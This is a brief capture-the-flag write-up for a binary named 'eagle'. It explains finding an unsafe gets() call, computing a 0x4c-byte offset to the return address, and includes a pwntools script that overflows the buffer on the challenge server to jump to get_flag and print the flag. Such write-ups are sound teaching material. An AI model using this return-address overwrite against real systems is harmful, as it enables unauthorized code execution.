Binary- eagle

When we run binary it asks user for input and as soon as I saw the glimpse of being asked for input I had a feeling of usage of gets function which is vulnerable to buffer overflows by default as
it will read user input as long as it doesn't encounter a newline character.

After viewing the disassembly of the given binary, it was calling vuln function which was using gets for taking user input.Also, looking at other functions in the binary
I saw get_flag function.

Now I had the theory that all we have to do in this challenge is to call the get_flag function which would echo out the flag.

Looking at the disassembly of vuln it was reading 0x48 characters and as nothing else is on the distance so the distance to reach the return address would be
**saved EBP - [ebp-0x48] + 4** i.e **0x4c**.

So I used the following exploit:

```
from pwn import *
rem = remote("jh2i.com",50039)
print(rem.recv())
payload = 'A' * 0x4c
payload += p32(0x080484f6)
rem.sendline(payload)
print(rem.recv())
```

And just like that we got the flag ```LLS{if_only_eagle_would_buffer_overflow}```
